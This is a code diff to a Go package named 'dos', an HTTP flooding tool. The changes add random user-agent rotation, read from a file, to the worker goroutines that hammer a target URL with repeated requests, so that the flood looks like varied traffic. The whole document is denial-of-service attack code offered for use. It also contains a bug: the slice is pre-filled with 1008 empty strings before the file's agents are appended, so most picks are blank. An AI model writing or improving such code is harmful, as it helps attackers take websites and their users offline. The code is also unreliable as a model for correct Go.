@@ -1,10 +1,13 @@
 package dos
 
 import (
+		"os"
 		"fmt"
 		"time"
+		"bufio"
 		"runtime"
 		"net/http"
+		"math/rand"
 )
 
 // structure of DOS
@@ -16,6 +19,7 @@ type DOS struct {
 		useragents []string
 		headers map[string]string
 		s chan bool
+		client *http.Client
 }
 
 type ErrMethodDoesNotAllowed struct{
@@ -27,7 +31,24 @@ func (emdna *ErrMethodDoesNotAllowed) Error() string {
 }
 
 // making new instance of DOS
-func New(url string, method string, duration int, workers int, useragents []string, headers map[string]string) (*DOS, error) {
+func New(url string, method string, duration int, workers int, path_to_useragents string, headers map[string]string) (*DOS, error) {
+		// read useragents
+		f, err := os.Open(path_to_useragents)
+		if err != nil {
+				fmt.Println("useragents wasn't found on this path: "+path_to_useragents)
+				os.Exit(1)
+		}
+		scanner := bufio.NewScanner(f)
+		useragents := make([]string, 1008)
+		for scanner.Scan() {
+				useragents = append(useragents, scanner.Text())
+		}
+		if err := scanner.Err(); err != nil {
+				fmt.Println("error while reading useragents, exiting...")
+				os.Exit(1)
+		}
+		f.Close()
+		// makinh channel to manipulate work of worlers
 		s := make(chan bool)
 		return &DOS{
 				url: url,
@@ -36,6 +57,7 @@ func New(url string, method string, duration int, workers int, useragents []stri
 				workers: workers,
 				useragents: useragents,
 				headers: headers,
+				client: &http.Client{},
 				s: s,
 		}, nil
 }
@@ -52,12 +74,16 @@ func (d *DOS) start() {
 		// starting workers
 		for i := 0; i < d.workers; i++ {
 				go func() {
+						// generating seed to provide the real random number
+						rand.Seed(time.Now().UnixNano())
+						// random useragent
+						useragent := d.useragents[rand.Intn(len(d.useragents))]
 						for {
 								select {
 								case <- d.s:
 										return
 								default:
-										err := d.attack()
+										err := d.attack(useragent)
 										if err != nil {
 												fmt.Println(err)
 										} else {
@@ -77,9 +103,14 @@ func (d *DOS) stop() {
 }
 
 // making http request
-func (d *DOS) attack() error {
+func (d *DOS) attack(useragent string) error {
 		if d.method == "GET" {
-				resp, err := http.Get(d.url)
+				req, err := http.NewRequest(d.method, d.url, nil)
+				if err != nil {
+						return err
+				}
+				req.Header.Set("User-Agent", useragent)
+				resp, err := d.client.Do(req)
 				if err != nil {
 						return err
 				} else {
